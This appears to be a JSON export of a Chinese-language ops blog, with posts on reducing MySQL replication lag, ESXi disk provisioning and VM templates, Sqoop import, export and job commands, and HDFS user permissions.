其他问题与解决方案如果一个生产场景，在某一时刻，有大量的数据向同一个数据库执行写操作，这个时候，多线程复制功能便失去了从库降低延迟的作用。这个时候还需要继续优化 配置sync_binlog和innodb_flush_log参数12mysql&gt; show variables like &#39;sync_binlog&#39;;mysql&gt; set global sync_binlog&#x3D;0; 含义：当事务提交之后，MySQL不做fsync之类的磁盘同步指令刷新binlog_cache中的信息到磁盘，而让Filesystem自行决定什么时候来做同步，或者cache满了之后才同步到磁盘。 12mysql&gt; SHOW VARIABLES LIKE &#39;%innodb_flush_log_at_trx_commit%&#39;;mysql&gt; SET GLOBAL innodb_flush_log_at_trx_commit &#x3D; 0; 含义：innodb_flush_log_at_trx_commit设置为【0或2, 默认为1】不同的值，性能差别很明显。可以通过设置为0或者2来提高事物提高性能。但是这种设置丧失了ACID特性。 附加：从库配置my.cnf文件参数1234slave-parallel-type&#x3D;LOGICAL_CLOCKslave-parallel-workers&#x3D;8sync_binlog&#x3D;0innodb_flush_log_at_trx_commit&#x3D;0","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"mysql","slug":"mysql","permalink":"https://garywu520.github.io/tags/mysql/"},{"name":"主从复制","slug":"主从复制","permalink":"https://garywu520.github.io/tags/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"name":"降低延迟","slug":"降低延迟","permalink":"https://garywu520.github.io/tags/%E9%99%8D%E4%BD%8E%E5%BB%B6%E8%BF%9F/"},{"name":"mysql 5.7","slug":"mysql-5-7","permalink":"https://garywu520.github.io/tags/mysql-5-7/"},{"name":"多线程主从复制","slug":"多线程主从复制","permalink":"https://garywu520.github.io/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"}]},{"title":"ESXI vm磁盘精简置备转换为厚置备","slug":"ESXI-vm磁盘精简置备转换为厚置备","date":"2019-03-20T07:33:57.000Z","updated":"2019-03-20T07:50:31.228Z","comments":true,"path":"2019/03/20/ESXI-vm磁盘精简置备转换为厚置备/","link":"","permalink":"https://garywu520.github.io/2019/03/20/ESXI-vm%E7%A3%81%E7%9B%98%E7%B2%BE%E7%AE%80%E7%BD%AE%E5%A4%87%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%8E%9A%E7%BD%AE%E5%A4%87/","excerpt":"","text":"前提条件 关闭vm虚拟机电源 移除快照 要转换的vm磁盘类型为精简置备 操作过程 浏览要扩充vm的虚拟磁盘文件夹，找到并选中xxx.vmdk文件 右键xxx.vmdk文件，选择“扩充磁盘” 。此过程花费时间较长，需要耐心等待… 注：此操作会将磁盘类型从精简置备变更为厚置备磁盘，此时扩充的虚拟磁盘将占据最初为其置备的整个数据存储空间。 关于磁盘置备类型，参考：ESXI虚拟机磁盘置备","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"ESXI","slug":"ESXI","permalink":"https://garywu520.github.io/tags/ESXI/"},{"name":"vm","slug":"vm","permalink":"https://garywu520.github.io/tags/vm/"},{"name":"精简置备","slug":"精简置备","permalink":"https://garywu520.github.io/tags/%E7%B2%BE%E7%AE%80%E7%BD%AE%E5%A4%87/"},{"name":"厚置备","slug":"厚置备","permalink":"https://garywu520.github.io/tags/%E5%8E%9A%E7%BD%AE%E5%A4%87/"}]},{"title":"ESXI虚拟机磁盘置备","slug":"ESXI虚拟机磁盘置备","date":"2019-03-20T06:35:17.000Z","updated":"2019-03-20T06:59:54.707Z","comments":true,"path":"2019/03/20/ESXI虚拟机磁盘置备/","link":"","permalink":"https://garywu520.github.io/2019/03/20/ESXI%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%BD%AE%E5%A4%87/","excerpt":"虚拟磁盘置备策略分类 精简置备 厚置备置零 厚置备延迟置零 怎么理解？举个例子12345678比如：在酒店办酒席~ ~ ~-- 精简置备 来了多少客人就开多少桌酒席，每次来了新客人就需要重新划分空间，摆桌子摆椅子什么的。-- 厚置备置零 腾出一层楼面，桌子椅子全部摆好，客人来了可以直接就座。-- 厚置备延迟置零 先腾出一层楼面来摆酒席，等客人来的时候再摆桌子摆椅子。 这个例子参考自：知乎-西瓜","text":"虚拟磁盘置备策略分类 精简置备 厚置备置零 厚置备延迟置零 怎么理解？举个例子12345678比如：在酒店办酒席~ ~ ~-- 精简置备 来了多少客人就开多少桌酒席，每次来了新客人就需要重新划分空间，摆桌子摆椅子什么的。-- 厚置备置零 腾出一层楼面，桌子椅子全部摆好，客人来了可以直接就座。-- 厚置备延迟置零 先腾出一层楼面来摆酒席，等客人来的时候再摆桌子摆椅子。 这个例子参考自：知乎-西瓜 官方解释 精简置备 1使用此格式可节省存储空间。对于精简磁盘，可以根据输入的虚拟磁盘大小值置备磁盘所需的数据存储空间。但是，精简磁盘开始时很小，只使用与初始操作所需的大小完全相同的存储空间。如果精简磁盘以后需要更多空间，它可以增长到其最大容量，并占据为其置备的整个数据存储空间。 厚置备置零 1一种厚虚拟磁盘类型，创建虚拟磁盘时，会立即将物理设备上保留的数据置零(即清空)。创建这种格式的虚拟磁盘所需的时间可能会比创建其他类型的磁盘所用时间长。 厚置备延迟置零 1以默认的厚格式创建虚拟磁盘。在创建虚拟磁盘时分配该磁盘所需的空间。创建过程中不会立即清除物理设备上保留的数据，但以后首次从虚拟机写入时则会按需置零(即按需清空)。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"ESXI","slug":"ESXI","permalink":"https://garywu520.github.io/tags/ESXI/"},{"name":"vm","slug":"vm","permalink":"https://garywu520.github.io/tags/vm/"},{"name":"精简置备","slug":"精简置备","permalink":"https://garywu520.github.io/tags/%E7%B2%BE%E7%AE%80%E7%BD%AE%E5%A4%87/"},{"name":"厚置备","slug":"厚置备","permalink":"https://garywu520.github.io/tags/%E5%8E%9A%E7%BD%AE%E5%A4%87/"},{"name":"磁盘置备","slug":"磁盘置备","permalink":"https://garywu520.github.io/tags/%E7%A3%81%E7%9B%98%E7%BD%AE%E5%A4%87/"},{"name":"disk","slug":"disk","permalink":"https://garywu520.github.io/tags/disk/"}]},{"title":"ESXI制作Linux系统模板","slug":"ESXI制作Linux系统模板","date":"2019-03-20T02:36:28.000Z","updated":"2019-03-20T03:36:32.075Z","comments":true,"path":"2019/03/20/ESXI制作Linux系统模板/","link":"","permalink":"https://garywu520.github.io/2019/03/20/ESXI%E5%88%B6%E4%BD%9CLinux%E7%B3%BB%E7%BB%9F%E6%A8%A1%E6%9D%BF/","excerpt":"有两种方式实现方式一：OVF导出导入这种方式是，在VMware Workstation Pro中创建好虚拟机，并将所需环境配置和优化完毕，然后关闭虚拟机并将其导出为OVF格式镜像，这种镜像是直接可以在ESXI中使用的。 ESXI使用：登陆ESXI客户端 – 文件 – 部署OVF模板 – 上传OVF格式镜像即可。","text":"有两种方式实现方式一：OVF导出导入这种方式是，在VMware Workstation Pro中创建好虚拟机，并将所需环境配置和优化完毕，然后关闭虚拟机并将其导出为OVF格式镜像，这种镜像是直接可以在ESXI中使用的。 ESXI使用：登陆ESXI客户端 – 文件 – 部署OVF模板 – 上传OVF格式镜像即可。 方式二：通过vmdk文件在ESXI中，创建完成的虚拟机默认格式即为vmdk, 所以可以直接从现有的vmdk中创建vm (1) 首先在ESXI中创建一个虚拟机，并配置和优化所需环境，把这个虚拟机当做模板 (2) 找到此虚拟机安装文件所在的位置，并关闭此虚拟机 (3) 创建新虚拟机 ​ 接下来根据提示配置vm硬件参数 紧接着点击完成，启动使用模板创建的vm吧","categories":[],"tags":[{"name":"ESXI","slug":"ESXI","permalink":"https://garywu520.github.io/tags/ESXI/"},{"name":"vm","slug":"vm","permalink":"https://garywu520.github.io/tags/vm/"},{"name":"VMware vSphere Client","slug":"VMware-vSphere-Client","permalink":"https://garywu520.github.io/tags/VMware-vSphere-Client/"},{"name":"VMware Workstation Pro","slug":"VMware-Workstation-Pro","permalink":"https://garywu520.github.io/tags/VMware-Workstation-Pro/"},{"name":"vmdk","slug":"vmdk","permalink":"https://garywu520.github.io/tags/vmdk/"}]},{"title":"Mars-Hadoop Sqoop Job","slug":"Mars-Hadoop-Sqoop-Job","date":"2019-03-13T08:26:53.000Z","updated":"2019-03-13T09:23:09.350Z","comments":true,"path":"2019/03/13/Mars-Hadoop-Sqoop-Job/","link":"","permalink":"https://garywu520.github.io/2019/03/13/Mars-Hadoop-Sqoop-Job/","excerpt":"Sqoop Job介绍12345作用：记录Sqoop命令的配置信息，包括关系型数据库连接地址、用户名、密码、数据库和表等等信息。Job：存储在User私有目录(即linux用户的家目录)$HOME&#x2F;.sqoop&#x2F;下，可将此配置为共享的metastore中(供集群中多用户使用)应用场景：多次执行同一个导入导出命令(尤其是增量导入时) Sqoop Job帮助1234567sqoop job --create &lt;job-id&gt; #创建作业(ID或名称) --delete &lt;job-id&gt; #删除作业(ID或名称) --exec &lt;job-id&gt; #执行作业 --list #列出当前已创建的作业 --meta-connect &lt;jdbc-uri&gt; #指定共享metastore --help","text":"Sqoop Job介绍12345作用：记录Sqoop命令的配置信息，包括关系型数据库连接地址、用户名、密码、数据库和表等等信息。Job：存储在User私有目录(即linux用户的家目录)$HOME&#x2F;.sqoop&#x2F;下，可将此配置为共享的metastore中(供集群中多用户使用)应用场景：多次执行同一个导入导出命令(尤其是增量导入时) Sqoop Job帮助1234567sqoop job --create &lt;job-id&gt; #创建作业(ID或名称) --delete &lt;job-id&gt; #删除作业(ID或名称) --exec &lt;job-id&gt; #执行作业 --list #列出当前已创建的作业 --meta-connect &lt;jdbc-uri&gt; #指定共享metastore --help 示例 12增量导入sqoop import --connect jdbc:mysql:&#x2F;&#x2F;10.0.10.100:3306&#x2F;bigdata --username root -P --table bigdata --target-dir &#x2F;sqoopim --check-column class_id --incremental append --last-value 18 -m 1 123419&#x2F;03&#x2F;12 16:33:50 INFO tool.ImportTool: --incremental append19&#x2F;03&#x2F;12 16:33:50 INFO tool.ImportTool: --check-column class_id19&#x2F;03&#x2F;12 16:33:50 INFO tool.ImportTool: --last-value 2219&#x2F;03&#x2F;12 16:33:50 INFO tool.ImportTool: (Consider saving this with &#39;sqoop job --create&#39;) 创建job123456格式：sqoop job --create job1 -- [sqoop common]sqoop job --create job1 -- import --connect jdbc:mysql:&#x2F;&#x2F;10.0.10.100:3306&#x2F;bigdata --username root -P --table bigdata --target-dir &#x2F;sqoopim --check-column class_id --incremental append --last-value 22 -m 1注意：创建job时，如果有--last-value参数，需要将此参数的值更新;而执行job的过程中，job会自动更新此信息 查看job1234查看已有列表# sqoop job --list Available jobs: job1 12查看具体job内容sqoop job --show job1 12345678910111213Job: job1Tool: importOptions:----------------------------verbose &#x3D; falsehcatalog.drop.and.create.table &#x3D; falseincremental.last.value &#x3D; 22db.connect.string &#x3D; jdbc:mysql:&#x2F;&#x2F;10.0.10.100:3306&#x2F;bigdata............hdfs.target.dir &#x3D; &#x2F;sqoopimhive.fail.table.exists &#x3D; falsedb.batch &#x3D; false 执行job任务1sqoop job --exec job1 错误解决12345报错：Exception in thread &quot;main&quot; java.lang.NoClassDefFoundError: org&#x2F;json&#x2F;JSONObject at org.apache.sqoop.util.SqoopJsonUtil.getJsonStringforMap(SqoopJsonUtil.java:43) at org.apache.sqoop.SqoopOptions.writeProperties(SqoopOptions.java:785) at org.apache.sqoop.metastore.hsqldb.Hsqldbe.createInternal(HsqldbJobStorage.java:399) 1原因是sqoop缺少java-json.jar包 下载：java-json.jar 12解决方法：把java-json.jar添加到..&#x2F;sqoop&#x2F;lib目录：cp java-json.jar ..&#x2F;sqoop&#x2F;lib","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"大数据","slug":"大数据","permalink":"https://garywu520.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"hdfs","slug":"hdfs","permalink":"https://garywu520.github.io/tags/hdfs/"},{"name":"Sqoop","slug":"Sqoop","permalink":"https://garywu520.github.io/tags/Sqoop/"},{"name":"hadoop Job","slug":"hadoop-Job","permalink":"https://garywu520.github.io/tags/hadoop-Job/"}]},{"title":"Mars-hadoop sqoop导出实战","slug":"Mars-hadoop-sqoop导出实战","date":"2019-03-13T07:38:36.000Z","updated":"2019-03-13T08:20:11.960Z","comments":true,"path":"2019/03/13/Mars-hadoop-sqoop导出实战/","link":"","permalink":"https://garywu520.github.io/2019/03/13/Mars-hadoop-sqoop%E5%AF%BC%E5%87%BA%E5%AE%9E%E6%88%98/","excerpt":"一、可能的数据处理架构1Sqoop import -&gt;Hive&#x2F;HDFS -&gt;MR Job&#x2F;Spark Job&#x2F;Streaming Job&#x2F;ML Job&#x2F;SQL -&gt; Result Data 二、Sqoop导出通用参数 –connect 连接关系型数据库 –username 关系型数据库用户 –password/-P 关系型数据库密码","text":"一、可能的数据处理架构1Sqoop import -&gt;Hive&#x2F;HDFS -&gt;MR Job&#x2F;Spark Job&#x2F;Streaming Job&#x2F;ML Job&#x2F;SQL -&gt; Result Data 二、Sqoop导出通用参数 –connect 连接关系型数据库 –username 关系型数据库用户 –password/-P 关系型数据库密码 三、Sqoop导出控制参数–columns 字段1,字段2,字段3 1注意: 没有被包含在--columns后面(例如class_month,last_mod_ts)的这些列名或字段要么具备默认值，要么就允许插入空值，数据库会拒绝接受sqoop导出的数据，导致Sqoop作业失败 –export-dir 123指定导出目录，在执行导出的时候，必须指定这个参数，同时具备--table或--call参数的两者之一。--table指的是导出数据库当中对应的表--call 指的是某个存储过程 –input-null-string、–input-null-non-string 12这两个参数可选，如果没有指定第一个参数[--input-null-string]，对于字符串类型的列来说，“NULL”这个字符串就会被翻译为空值。如果没有第二个参数[--input-null-non-string]，无论是“NULL”字符串还是空字符串也好，对于非字符串类型的字段来说，这两个类型的字符串都会被翻译成空值 四、全表从HDFS导出-示例1sqoop export --connect jdbc:mysql:&#x2F;&#x2F;serverip:3306&#x2F;bigdata --username root -P --table bigdata --export-dir &#x2F;user&#x2F;root&#x2F;bigdata 五、全表从HDFS更新/增量导出 –update-key 更新标识，即根据某个字段进行更新，例如class_id，可以同时指定多个更新标识，用逗号分隔 –updatemod 有两种模式: 一种是updateonly(默认模式)，仅仅更新已存在的数据记录，不会插入新纪录 另一种模式时allowinsert,允许插入新纪录 Sqoop的Export工具，对应两种语句 1一种是Insert语句，如果表当中存在PK[主键]约束，且表中已包含数据，此时，导出报错。 需要用到—update-key和updatemod 12345如果指定了update-key，那么Sqoop就会修改在数据表中已存在的数据，此时的每一个更新数据记录都会变成一个Update语句，用这个语句去更新目标表中已存在的数据，这是根据–update-key所指定的这个列进行更新的。(1）若update-key所指定的字段不是PK[主键]字段，若同时updatemod使用updateonly模式时，就仅进行更新；若updatemod使用allowinsert模式，那么实质上就是一个insert操作 (2）若update-key所指定的字段是PK[主键]字段，同时updatemod是allowinsert时，实质上是一个insert &amp; update的操作；若updatemod是updateonly时，实质仅为update操作 更新/增量导出-示例updateonly模式 1sqoop export --connect jdbc:mysql:&#x2F;&#x2F;serverip:3306&#x2F;bigdata --username root -P --table bigdata --export-dir &#x2F;user&#x2F;root&#x2F;bigdata&#x2F; --update-key class_id --update-mode updateonly allowinsert模式 1sqoop export --connect jdbc:mysql:&#x2F;&#x2F;serverip:3306&#x2F;bigdata --username root -P --table bigdata2 --export-dir &#x2F;user&#x2F;root&#x2F;bigdata&#x2F; --update-key class_id --update-mode updateinsert","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"hadoop","slug":"hadoop","permalink":"https://garywu520.github.io/tags/hadoop/"},{"name":"hdfs","slug":"hdfs","permalink":"https://garywu520.github.io/tags/hdfs/"},{"name":"sqoop","slug":"sqoop","permalink":"https://garywu520.github.io/tags/sqoop/"}]},{"title":"Mars-Hadoop Sqoop增量导入实战","slug":"Mars-Hadoop-Sqoop增量导入实战","date":"2019-03-12T09:39:29.000Z","updated":"2019-03-12T09:43:24.704Z","comments":true,"path":"2019/03/12/Mars-Hadoop-Sqoop增量导入实战/","link":"","permalink":"https://garywu520.github.io/2019/03/12/Mars-Hadoop-Sqoop%E5%A2%9E%E9%87%8F%E5%AF%BC%E5%85%A5%E5%AE%9E%E6%88%98/","excerpt":"一、核心参数–check-column 123用来指定一些列，这些列在导入时用来检查做决定数据是否要被作为增量数据，在一般关系型数据库中，都存在类似Last_Mod_Date的字段或主键。注意：这些被检查的列的类型不能是任意字符类型，例如Char,VARCHAR...(即字符类型不能作为增量标识字段) –incremental 1用来指定增量导入的模式(Mode),两种模式为: append(附加&#x2F;一般是指新增的内容)和lastmodified(最新修改的内容) –last-value 1指定上一次导入时，检查列指定字段的最大值","text":"一、核心参数–check-column 123用来指定一些列，这些列在导入时用来检查做决定数据是否要被作为增量数据，在一般关系型数据库中，都存在类似Last_Mod_Date的字段或主键。注意：这些被检查的列的类型不能是任意字符类型，例如Char,VARCHAR...(即字符类型不能作为增量标识字段) –incremental 1用来指定增量导入的模式(Mode),两种模式为: append(附加&#x2F;一般是指新增的内容)和lastmodified(最新修改的内容) –last-value 1指定上一次导入时，检查列指定字段的最大值 二、增量模式(Mode)append 1在导入的新数据ID值是连续时使用，对数据进行附加 lastmodified 1在源表(关系型数据库源表)中有数据更新的时候使用，检查列就必须是一个时间戳或日期类型的字段，更新完成之后，last-value会被设置为执行增量导入时的当前系统时间 三、增量模式区别append 1加不加--last-value的区别在于：数据是否冗余，如果不加，则会导入源表中的所有数据导致数据冗余 lastmodified 1当使用–incremental lastmodified模式进行导入且导入目录已存在时，就需要使用--merge-key或--append 四、增量导入-Append模式-示例1234测试环境：1.将当前bigdata全表导入hdfs，查看2.向bigdata表新增4行数据3.增量导入 查看当前bigdata表的–last-value值，然后将全表导入到hdfs中 12345678910[hdfs@master1 ~]$ hadoop fs -cat /sqoopim/part-m-000001,bigdata intro.,8,Mars,2019-03-08 17:03:43.02,hadoop intro.,8,Mars,2019-03-08 17:03:43.0............16,spark mllib,1701,Mars,2019-03-08 17:03:43.017,SparkR,1702,Mars,2019-03-08 17:03:43.018,Spark Project,1703,Mars,2019-03-08 17:03:44.0上面的18即为我们想要记录的--last-value 向MySQL bigdata表新增4条数据 1略 增量导入命令 123sqoop import --connect jdbc:mysql://10.0.10.100:3306/bigdata --username root -P --table bigdata --target-dir /sqoopim --check-column class_id --incremental append --last-value 18 -m 1注：如果不加--last-value参数的话，数据会冗余增量全表，所以还是建议使用此参数 执行结果 1234567891011121319/03/12 16:33:50 INFO mapreduce.ImportJobBase: Transferred 142.0312 KB in 19.3976 seconds (7.3221 KB/sec)19/03/12 16:33:50 INFO mapreduce.ImportJobBase: Retrieved 5 records.19/03/12 16:33:50 INFO util.AppendUtils: Appending to directory sqoopim19/03/12 16:33:50 INFO util.AppendUtils: Using found partition 119/03/12 16:33:50 INFO tool.ImportTool: Incremental import complete! To run another incremental import of all data following this import, supply the following arguments:19/03/12 16:33:50 INFO tool.ImportTool: --incremental append19/03/12 16:33:50 INFO tool.ImportTool: --check-column class_id19/03/12 16:33:50 INFO tool.ImportTool: --last-value 2219/03/12 16:33:50 INFO tool.ImportTool: (Consider saving this with &#x27;sqoop job --create&#x27;)注：倒数第4行提示目前导入已经是append模式；--last-value已经从18变成了22，这个数值在下次apped增量导入的时候依然需要使用；最后提醒自己可以将其保存成一个作业，来保存--incremental append和--last-value 22这些信息 数据验证 12345[hdfs@master1 ~]$ hadoop fs -cat /sqoopim/part-m-0000119,spark mllib,1701,Mars,2019-03-08 17:03:43.020,SparkR,1702,Mars,2019-03-08 17:03:43.021,Spark Project,1703,Mars,2019-03-08 17:03:44.022,spark mllib,1701,Mars,2019-03-12 16:25:40.0 五、增量导入lastmodified模式-示例 –append附加：提前对表内容做些内容更新 1sqoop import --connect jdbc:mysql://10.0.10.100:3306/bigdata --username root -P --table bigdata --target-dir /sqoopim --check-column last_mod_ts --incremental lastmodified --last-value &quot;2019-03-08 17:13:44&quot; -m 1 --append 数据验证 123[hdfs@master1 ~]$ hadoop fs -cat /sqoopim/part-m-0000218,Spark Project,1703,Mars,2019-03-08 17:13:44.0[hdfs@master1 ~]$ –merge-key: 合并字段： 1sqoop import --connect jdbc:mysql:&#x2F;&#x2F;10.0.10.100:3306&#x2F;bigdata --username root -P --table bigdata --target-dir &#x2F;sqoopim --check-column last_mod_ts --incremental lastmodified --last-value &quot;2019-03-08 17:13:44&quot; -m 1 --merge-key class_id 12--merge-key 按照哪个字段进行合并--append 源数据不变，新增数据会附加到HDFS目录中","categories":[],"tags":[{"name":"大数据","slug":"大数据","permalink":"https://garywu520.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"hadoop","slug":"hadoop","permalink":"https://garywu520.github.io/tags/hadoop/"},{"name":"hdfs","slug":"hdfs","permalink":"https://garywu520.github.io/tags/hdfs/"},{"name":"sqoop","slug":"sqoop","permalink":"https://garywu520.github.io/tags/sqoop/"}]},{"title":"Mars-Hadoop Sqoop导入实战","slug":"Mars-Hadoop-Sqoop导入实战","date":"2019-03-12T07:45:39.000Z","updated":"2019-03-12T07:49:03.639Z","comments":true,"path":"2019/03/12/Mars-Hadoop-Sqoop导入实战/","link":"","permalink":"https://garywu520.github.io/2019/03/12/Mars-Hadoop-Sqoop%E5%AF%BC%E5%85%A5%E5%AE%9E%E6%88%98/","excerpt":"测试数据准备如下数据库名称：bigdata, 表名称: bigdata 123456789MariaDB [bigdata]&gt; select * from bigdata;+----------+--------------------------------+-------------+---------+---------------------+| class_id | class_name | class_month | teacher | last_mod_ts |+----------+--------------------------------+-------------+---------+---------------------+| 1 | bigdata intro. | 8 | Mars | 2019-03-08 17:03:43 || 2 | hadoop intro. | 8 | Mars | 2019-03-08 17:03:43 || 3 | hadoop components | 8 | Mars | 2019-03-08 17:03:43 || 4 | hadoop arch. | 8 | Mars | 2019-03-08 17:03:43 || 5 | hdfs | 9 | Mars | 2019-03-08 17:03:43 | Sqoop import to hdfs1234567# sqoop import \\ --connect jdbc:mysql://mysql_server_ip:3306/bigdata \\ --username root \\ -P \\ --table bitdata \\ --warehouse-dir /sqoopim \\ -m 1 Sqoop import to hive table1234567# sqoop import \\ --connect jdbc:mysql://mysql_server_ip:3306/bigdata \\ --username root \\ -P \\ --table bitdata \\ --hive-import --hive-database default --create-table \\ -m 1","text":"测试数据准备如下数据库名称：bigdata, 表名称: bigdata 123456789MariaDB [bigdata]&gt; select * from bigdata;+----------+--------------------------------+-------------+---------+---------------------+| class_id | class_name | class_month | teacher | last_mod_ts |+----------+--------------------------------+-------------+---------+---------------------+| 1 | bigdata intro. | 8 | Mars | 2019-03-08 17:03:43 || 2 | hadoop intro. | 8 | Mars | 2019-03-08 17:03:43 || 3 | hadoop components | 8 | Mars | 2019-03-08 17:03:43 || 4 | hadoop arch. | 8 | Mars | 2019-03-08 17:03:43 || 5 | hdfs | 9 | Mars | 2019-03-08 17:03:43 | Sqoop import to hdfs1234567# sqoop import \\ --connect jdbc:mysql://mysql_server_ip:3306/bigdata \\ --username root \\ -P \\ --table bitdata \\ --warehouse-dir /sqoopim \\ -m 1 Sqoop import to hive table1234567# sqoop import \\ --connect jdbc:mysql://mysql_server_ip:3306/bigdata \\ --username root \\ -P \\ --table bitdata \\ --hive-import --hive-database default --create-table \\ -m 1 (1) 通过Sqoop查看mysql数据库123# sqoop list-databases --connect jdbc:mysql://10.0.10.100:3306 --username root -Pmysqlbigdata (2) 通过Sqoop查看MySQL指定数据库的表12# sqoop list-tables --connect jdbc:mysql://10.0.10.100:3306/bigdata --username root -Pbigdata (3) Sqoop 导入 MySQL全表到hdfs指定目录1234567891011# sqoop import --connect jdbc:mysql://10.0.10.100:3306/bigdata --username root -P --table bigdata --warehouse-dir /sqoopim -m 1导入过程中可以看到，sqoop通过mapreduce.Job来完成导入操作注：1. 如果导入时不指定hdfs目录，默认导入到当前hadoop用户的/user/username目录下。 如果导入的目录已存在，则会提示错误。 2.如果一个表中没有设置主键，那么导入时会提示错误，解决方法：就需要提前设置主键 或 使用参数“-m 1”参数, 需要使用几个map任务并发执行 验证导入 12查看hadoop作业运行情况http://10.0.10.100:18088/cluster 1234# hadoop fs -ls /sqoopim/bigdataFound 2 items-rw-r--r-- 3 root supergroup 0 2019-03-08 17:38 /sqoopim/bigdata/_SUCCESS-rw-r--r-- 3 root supergroup 800 2019-03-08 17:38 /sqoopim/bigdata/part-m-00000 1234567# hadoop fs -cat /sqoopim/bigdata/part-m-000001,bigdata intro.,8,Mars,2019-03-08 17:03:43.02,hadoop intro.,8,Mars,2019-03-08 17:03:43.03,hadoop components,8,Mars,2019-03-08 17:03:43.0......可以看到这个表导入过来后，默认分隔符是“[英文]逗号” (4) Sqoop 导入 MySQL全表到hdfs【指定导入分隔符】123sqoop import --connect jdbc:mysql://10.0.10.100:3306/bigdata --username root -P --table bigdata --warehouse-dir /sqoopim -m 1 --fields-terminated-by &quot;|&quot;注：--fields-terminated-by参数用来指定分隔符，分隔符可以是“^”、&quot;\\t&quot;、&quot; &quot;等等 验证数据 1234567[hdfs@master1 ~]$ hadoop fs -cat /sqoopim/bigdata/part-m-000001|bigdata intro.|8|Mars|2019-03-08 17:03:43.02|hadoop intro.|8|Mars|2019-03-08 17:03:43.03|hadoop components|8|Mars|2019-03-08 17:03:43.04|hadoop arch.|8|Mars|2019-03-08 17:03:43.0............ (5) Sqoop 仅导入MySQL部分数据bigdata表，class_id≥5的数据进行导入 方式一： –query 123456sqoop import --connect jdbc:mysql://10.0.10.100:3306/bigdata --username root -P --query &quot;select * from bigdata where class_id&gt;=5 and \\$CONDITIONS&quot; -m 1 --target-dir /sqoopim注： --warehouse-dir和--target_dir均为指定导入目录参数，区别是--target_dir指定的目录必须不存在 --query &quot;select * from bigdata where class_id&gt;=5 and \\$CONDITIONS&quot; 匹配条件，其中反斜杠是将$符转义 123456[hdfs@master1 ~]$ hadoop fs -cat /sqoopim/part-m-000005,hdfs,9,Mars,2019-03-08 17:03:43.06,yarn,9,Mars,2019-03-08 17:03:43.07,sqoop,9,Mars,2019-03-08 17:03:43.08,hive,9,Mars,2019-03-08 17:03:43.09,Hive example:log analysis,10,Mars,2019-03-08 17:03:43.0 方式二：–where 1sqoop import --connect jdbc:mysql://10.0.10.100:3306/bigdata --username root -P --table bigdata --where &quot;class_id&gt;=10&quot; -m 1 --target-dir /sqoopim2 1234567[hdfs@master1 ~]$ hadoop fs -cat /sqoopim2/part-m-0000010,hbase,10,Mars,2019-03-08 17:03:43.011,kylin,11,Mars,2019-03-08 17:03:43.012,spark intro.,11,Mars,2019-03-08 17:03:43.013,spark arch,11,Mars,2019-03-08 17:03:43.014,spark sql,12,Mars,2019-03-08 17:03:43.0...... (6)Sqoop仅导入部分字段123[hdfs@master1 ~]$ sqoop import --connect jdbc:mysql://10.0.10.100:3306/bigdata --username root -P --table bigdata --columns class_id,class_month,teacher -m 1 --target-dir /sqoopim注：使用--columns参数指定字段 1234567[hdfs@master1 ~]$ hadoop fs -cat /sqoopim/part-m-000001,8,Mars2,8,Mars3,8,Mars4,8,Mars5,9,Mars6,9,Mars 扩展：将导入参数写入文件进行导入vim ./sqoop.im 以下面命令为例 1[hdfs@master1 ~]$ sqoop import --connect jdbc:mysql://10.0.10.100:3306/bigdata --username root -P --table bigdata --columns class_id,class_month,teacher -m 1 --target-dir /sqoopim 改为如下【要求：参数和值分别要占用独立行，且开头不能有空格】 1234567891011121314import --connect jdbc:mysql://10.0.10.100:3306/bigdata --username root -P --table bigdata --columnsclass_id,class_month,teacher-m 1 --target-dir /sqoopim 使用文件导入 1sqoop --options-file ./sqoop.im 其他1sqoop在执行导入操作后，会在当前目录下生成名为“QueryResult.java”文件，这就是底层Mapreduce生成的JAVA类文件","categories":[],"tags":[{"name":"大数据","slug":"大数据","permalink":"https://garywu520.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"hadoop","slug":"hadoop","permalink":"https://garywu520.github.io/tags/hadoop/"},{"name":"MySQL","slug":"MySQL","permalink":"https://garywu520.github.io/tags/MySQL/"},{"name":"sqoop","slug":"sqoop","permalink":"https://garywu520.github.io/tags/sqoop/"},{"name":"sqoop导入导出","slug":"sqoop导入导出","permalink":"https://garywu520.github.io/tags/sqoop%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/"}]},{"title":"hadoop hdfs用户组权限","slug":"hadoop hdfs用户组权限","date":"2019-03-12T03:45:24.000Z","updated":"2019-03-12T06:37:48.357Z","comments":true,"path":"2019/03/12/hadoop hdfs用户组权限/","link":"","permalink":"https://garywu520.github.io/2019/03/12/hadoop%20hdfs%E7%94%A8%E6%88%B7%E7%BB%84%E6%9D%83%E9%99%90/","excerpt":"先了解下hdfs的超级用户概念 12345超级用户即运行name node进程的用户。例如，你使用了root用户启动了name node，那么root就是超级用户。当name node开始运行时，进程自动判断谁现在是超级用户。HDFS的超级用户不一定非得是name node主机上的超级用户，也不需要所有的集群的超级用户都是一个。另外，下面我们通过手动去指定一个用户作为hadoop超级管理员用户，也具有超级管理员权限。 开启hdfs权限检查1234&lt;property&gt; &lt;name&gt;dfs.permissions.enabled&lt;/name&gt; #启用权限检查 &lt;value&gt;true&lt;/value&gt;&lt;/property&gt; 注：修改完以上配置后，需要重启namenode hdfs服务 